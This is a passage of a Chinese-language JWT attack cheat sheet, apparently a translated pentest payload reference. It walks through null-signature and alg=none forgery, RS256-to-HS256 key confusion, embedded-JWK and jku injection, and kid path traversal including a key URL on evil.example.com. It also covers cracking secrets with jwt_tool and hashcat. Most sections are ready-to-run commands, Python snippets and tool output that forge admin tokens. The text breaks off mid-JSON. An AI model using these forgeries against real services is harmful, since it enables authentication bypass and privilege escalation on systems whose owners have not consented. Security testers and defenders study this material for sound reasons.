# JWT - JSON Web Token

> JSON Web Token (JWT) 是一个开放标准（RFC 7519），它定义了一种通过 JSON 对象安全传输信息的紧凑且自包含的方式。由于其经过数字签名，因此可以被验证和信任。

## 概要

- [工具](#工具)
- [JWT 格式](#jwt格式)
    - [头部](#头部)
    - [负载](#负载)
- [JWT 签名](#jwt签名)
    - [JWT 签名 - 零签名攻击（CVE-2020-28042）](#jwt签名---零签名攻击cve-2020-28042)
    - [JWT 签名 - 正确签名的披露（CVE-2019-7644）](#jwt签名---正确签名的披露cve-2019-7644)
    - [JWT 签名 - 无算法（CVE-2015-9235）](#jwt签名---无算法cve-2015-9235)
    - [JWT 签名 - 密钥混淆攻击 RS256 到 HS256（CVE-2016-5431）](#jwt签名---密钥混淆攻击rs256到hs256cve-2016-5431)
    - [JWT 签名 - 密钥注入攻击（CVE-2018-0114）](#jwt签名---密钥注入攻击cve-2018-0114)
    - [JWT 签名 - 从签名的 JWT 中恢复公钥](#jwt签名---从签名的jwts中恢复公钥)
- [JWT 秘钥](#jwt秘钥)
    - [使用秘钥编码和解码 JWT](#使用秘钥编码和解码jwt)
    - [破解 JWT 秘钥](#破解jwt秘钥)
- [JWT 声明](#jwt声明)
    - [JWT kid 声明误用](#jwtkid声明误用)
    - [JWKS - jku 头部注入](#jwks---jku头部注入)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 工具

- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) - 🐍 测试、调整和破解 JSON Web Tokens 的工具包。
- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - 使用 C 编写的 JWT 暴力破解工具。
- [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - JavaScript Object Signing 和 Encryption 渗透测试辅助工具。
- [jwt.io](https://jwt.io/) - 编码器/解码器。

## JWT 格式

JSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`

示例 : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

我们可以将其分成三个部分，用点号分隔。

```powershell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # 头部
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # 负载
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # 签名
```

### 头部

注册的头部参数名称在 [JSON Web Signature (JWS) RFC](https://www.rfc-editor.org/rfc/rfc7515) 中定义。
最基本的 JWT 头部如下所示的 JSON：

```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```

其他参数在 RFC 中也有注册。

| 参数 | 定义 | 描述 |
|------|------|------|
| alg | 算法 | 标识用于保护 JWS 的加密算法 |
| jku | JWK 集合 URL | 引用一组 JSON 编码的公钥资源 |
| jwk | JSON Web Key | 用于数字签名 JWS 的公钥 |
| kid | 密钥 ID | 用于保护 JWS 的密钥 |
| x5u | X.509 URL | X.509 公钥证书或证书链的 URL |
| x5c | X.509 证书链 | 用于数字签名 JWS 的 DER 编码的 X.509 公钥证书或证书链（PEM 编码） |
| x5t | X.509 证书 SHA-1 指纹 | DER 编码的 X.509 证书的 Base64 URL 编码 SHA-1 指纹（摘要） |
| x5t#S256 | X.509 证书 SHA-256 指纹 | DER 编码的 X.509 证书的 Base64 URL 编码 SHA-256 指纹（摘要） |
| typ | 类型 | 媒体类型。通常是 `JWT` |
| cty | 内容类型 | 不推荐使用此头参数 |
| crit | 关键 | 扩展和/或 JWA 被使用 |

默认算法是 "HS256"（HMAC SHA256 对称加密）。
"RS256" 用于非对称目的（RSA 非对称加密和私钥签名）。

| `alg` 参数值 | 数字签名或 MAC 算法 | 要求 |
|--------------|--------------------|------|
| HS256        | 使用 SHA-256 的 HMAC | 必须 |
| HS384        | 使用 SHA-384 的 HMAC | 可选 |
| HS512        | 使用 SHA-512 的 HMAC | 可选 |
| RS256        | 使用 SHA-256 的 RSASSA-PKCS1-v1_5 | 推荐 |
| RS384        | 使用 SHA-384 的 RSASSA-PKCS1-v1_5 | 可选 |
| RS512        | 使用 SHA-512 的 RSASSA-PKCS1-v1_5 | 可选 |
| ES256        | 使用 P-256 和 SHA-256 的 ECDSA | 推荐 |
| ES384        | 使用 P-384 和 SHA-384 的 ECDSA | 可选 |
| ES512        | 使用 P-521 和 SHA-512 的 ECDSA | 可选 |
| PS256        | 使用 SHA-256 和 MGF1 的 RSASSA-PSS | 可选 |
| PS384        | 使用 SHA-384 和 MGF1 的 RSASSA-PSS | 可选 |
| PS512        | 使用 SHA-512 和 MGF1 的 RSASSA-PSS | 可选 |
| none         | 不进行数字签名或 MAC | 必须 |

使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) 注入头部：`python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`

### 负载

```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

声明是预定义的键及其值：

- iss: 发布者的标识
- exp: 过期时间戳（拒绝过期的令牌）。注意：根据规范，必须以秒为单位。
- iat: JWT 发行的时间。可用于确定 JWT 的年龄。
- nbf: “不是之前” 是指令牌将在未来某个时间变为有效。
- jti: JWT 的唯一标识符。用于防止 JWT 被重用或重放。
- sub: 令牌的主题（很少使用）
- aud: 令牌的受众（也很少使用）

使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) 注入负载声明：`python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`

## JWT 签名

### JWT 签名 - 零签名攻击（CVE-2020-28042）

发送一个没有签名的 JWT，使用 HS256 算法，例如 `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`

**漏洞利用**：

```ps1
python3 jwt_tool.py JWT_HERE -X n
```

**分解**：

```json
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

### JWT 签名 - 正确签名的披露（CVE-2019-7644）

发送带有错误签名的 JWT，端点可能会响应错误并披露正确的签名。

- [jwt-dotnet/jwt: Critical Security Fix Required: 每次 SignatureVerificationException 都会披露正确的签名... #61](https://github.com/jwt-dotnet/jwt/issues/61)
- [CVE-2019-7644: Auth0-WCF-Service-JWT 中的安全漏洞](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```ps1
无效的签名。期望 SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c，得到 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
无效的签名。期望 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y=，得到 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```

### JWT 签名 - 无算法（CVE-2015-9235）

JWT 支持用于签名的 `None` 算法。这可能是为了调试应用程序而引入的。然而，这可能对应用程序的安全性产生严重影响。

无算法变体：

- `none`
- `None`
- `NONE`
- `nOnE`

要利用此漏洞，您只需解码 JWT 并更改用于签名的算法。然后您可以提交您的新 JWT。但是，除非您**删除**签名，否则这不会起作用。

或者，您可以修改现有的 JWT（小心过期时间）

- 使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py [JWT_HERE] -X a
    ```

- 手动编辑 JWT

    ```python
    import jwt

    jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
    decodedToken = jwt.decode(jwtToken, verify=False)       

    # 解码令牌后再使用类型 'None' 进行编码
    noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

    print(noneEncoded.decode())
    ```

### JWT 签名 - 密钥混淆攻击 RS256 到 HS256（CVE-2016-5431）

如果服务器代码期望 "alg" 设置为 RSA 的令牌，但收到 "alg" 设置为 HMAC 的令牌，它可能会在验证签名时无意中将公钥用作 HMAC 对称密钥。

因为公钥有时可以被攻击者获取，攻击者可以通过将头中的算法修改为 HS256 并使用 RSA 公钥来签署数据。当应用程序使用相同的 RSA 密钥对作为其 TLS 网站服务器时：`openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`

> 算法 **HS256** 使用秘密密钥对每条消息进行签名和验证。
> 算法 **RS256** 使用私钥对消息进行签名，并使用公钥进行认证。

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

:warning: 在 Python 库中这种行为已修复，并将返回此错误 `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`。需要安装以下版本：`pip install pyjwt==0.4.3`。

- 使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
    ```

- 使用 [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. 查找公钥，通常在 `/jwks.json` 或 `/.well-known/jwks.json` 中
    2. 在 JWT Editor 的 Keys 标签页加载它，点击 `New RSA Key`。
    3. 在对话框中粘贴之前获得的 JWK：`{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
    4. 选择 PEM 单选按钮并复制生成的 PEM 密钥。
    5. 返回到 Decoder 标签页并 Base64 编码 PEM。
    6. 返回到 JWT Editor 的 Keys 标签页并生成一个 JWK 格式的 `New Symmetric Key`。
    7. 将生成的 k 参数值替换为您刚刚复制的 Base64 编码的 PEM 密钥。
    8. 编辑 JWT 令牌的 alg 为 `HS256` 并编辑数据。
    9. 点击 `Sign` 并保持选项：`Don't modify header`

- 手动使用以下步骤将 RS256 JWT 令牌编辑为 HS256
    1. 使用以下命令将我们的公钥（key.pem）转换为十六进制。

        ```powershell
        $ cat key.pem | xxd -p | tr -d "\\n"
        2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
        ```

    2. 使用我们的公钥作为 ASCII 十六进制并使用我们之前编辑的令牌生成 HMAC 签名。

        ```powershell
        $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

        (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
        ```

    3. 将签名从十六进制转换为“Base64 URL”

        ```powershell
        python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
        ```

    4. 将签名添加到编辑后的有效载荷中

        ```powershell
        [头部编辑为 RS256 到 HS256].[数据编辑].[签名]
        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
        ```

### JWT 签名 - 密钥注入攻击（CVE-2018-0114）

> 在 0.11.0 版本之前的 Cisco node-jose 开源库存在一个漏洞，未经身份验证的远程攻击者可以使用嵌入在令牌中的密钥重新签署令牌。该漏洞是由于 node-jose 遵循 JSON Web Signature (JWS) 标准处理 JSON Web Tokens (JWTs) 导致的。该标准规定可以在 JWS 的头部嵌入表示公钥的 JSON Web Key (JWK)，这个公钥随后会被信任用于验证。攻击者可以通过移除原始签名、在头部添加新的公钥，并使用嵌入在该 JWS 头部中的公钥对应的私钥来伪造有效的 JWS 对象来利用此漏洞。

**漏洞利用**：

- 使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py [JWT_HERE] -X i
    ```

- 使用 [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. 添加一个新的 RSA 密钥
    2. 在 JWT 的 Repeater 标签页编辑数据
    3. `攻击` > `嵌入的 JWK`

**分解**：

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.
{"login":"admin"}.
[使用新的私钥签名；公钥注入]
```

### JWT 签名 - 从签名的 JWT 中恢复公钥

RS256、RS384 和 RS512 算法使用 RSA 和 PKCS#1 v1.5 填充作为其签名方案。这具有这样一个特性：您可以给定两个不同的消息和伴随的签名来计算出公钥。

[SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): 从两个签名的 JWT 计算 RSA 公钥

```ps1
$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
计算公钥。这可能需要一分钟...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
```

## JWT 秘钥

> 创建 JWT 时，使用秘密密钥对头部和负载进行签名，从而生成签名。必须保密并安全地保管秘密密钥，以防止未经授权访问 JWT 或篡改其内容。如果攻击者能够访问秘密密钥，他们可以创建、修改或签署自己的令牌，绕过预期的安全控制。

### 使用秘钥编码和解码 JWT

- 使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)：

    ```ps1
    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T
    
    Token header values:
    [+] alg = "HS256"
    [+] typ = "JWT"

    Token payload values:
    [+] name = "John Doe"
    ```

- 使用 [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`

    ```python
    import jwt
    encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
    jwt.decode(encoded, 'secret', algorithms=['HS256']) 
    ```

### 破解 JWT 秘钥

有用的 3502 个公共可用的 JWT 列表：[wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)，包括 `your_jwt_secret`、`change_this_super_secret_random_string` 等。

#### JWT 工具

首先，使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) 暴力破解用于计算签名的秘密密钥。

```powershell
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
```

然后编辑 JSON Web Token 中的字段。

```powershell
当前 role 的值为: user
请输入新值并按回车
> admin
[1] sub = 1234567890
[2] role = admin
[3] iat = 1516239022
[0] 继续下一步

请选择字段编号（或 0 继续）：
> 0
```

最后，使用之前检索到的“秘密”密钥对令牌进行签名。

```powershell
令牌签名：
[1] 使用已知密钥对令牌进行签名
[2] 从易受 CVE-2015-2951 影响的令牌中剥离签名
[3] 使用公钥绕过漏洞进行签名
[4] 使用密钥文件对令牌进行签名

请从上述选项中选择一个（1-4）：
> 1

请输入已知密钥：
> secret

请输入密钥长度：
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

您的新伪造令牌：
[+] URL 安全: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
[+] 标准: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
```

- 侦察: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
- 扫描: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
- 利用: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
- 模糊测试: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
- 审查: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`

#### Hashcat

> 在单块 GTX1080 上支持以 365MH/s 的速度破解 JWT（JSON Web Token） - [src](https://twitter.com/hashcat/status/955154646494040065)

- 字典攻击: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
- 基于规则的攻击: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
- 暴力攻击: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`

## JWT 声明

[IANA 的 JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)

### JWT kid 声明误用

JSON Web Token (JWT) 中的 "kid"（密钥 ID）声明是可选的头部参数，用于指示用于签名或加密 JWT 的加密密钥的标识符。需要注意的是，密钥标识符本身不提供任何安全性优势，而是使接收方能够定位用于验证 JWT 完整性的所需密钥。

- 示例 #1 : 本地文件

    ```json
    {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/root/res/keys/secret.key"
    }
    ```

- 示例 #2 : 远程文件

    ```json
    {
        "alg":"RS256",
        "typ":"JWT",
        "kid":"http://localhost:7070/privKey.key"
    }
    ```

kid 头部中指定的文件内容将用于生成签名。

```js
// 示例 HS256
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret-from-secret.key
)
```

常见的 kid 头部误用方式：

- 获取密钥内容以更改负载
- 更改密钥路径以强制执行自己的

    ```py
    >>> jwt.encode(
    ...     {"some": "payload"},
    ...     "secret",
    ...     algorithm="HS256",
    ...     headers={"kid": "http://evil.example.com/custom.key"},
    ... )
    ```

- 更改密钥路径为具有可预测内容的文件。

  ```ps1
  python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
  python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
  ```

- 修改 kid 头部以尝试 SQL 和命令注入

### JWKS - jku 头部注入

"jku" 头部值指向 JWKS 文件的 URL。通过将 "jku" URL 替换为包含公钥的攻击者控制的 URL，攻击者可以使用配对的私钥签署令牌，并让服务检索恶意公钥并验证令牌。

有时可以通过标准端点公开暴露：

- `/jwks.json`
- `/.well-known/jwks.json`
- `/openid/connect/jwks.json`
- `/api/keys`
- `/api/v1/keys`
- [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)

你应该为此攻击创建自己的密钥对并托管它。它应该看起来像这样：

```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
        }
    ]
}
```

**漏洞利用**：

- 使用 [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py JWT_HERE -X s
    python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
    ```

- 使用 [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. 生成一个新的 RSA 密钥并托管它
    2. 编辑 JWT 的数据
    3. 将 kid 头部替换为你自己的 JWKS 中的 kid
    4. 添加 jku 头部并签署 JWT（应勾选“不要修改头部”选项）

**分解**：

```json
{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"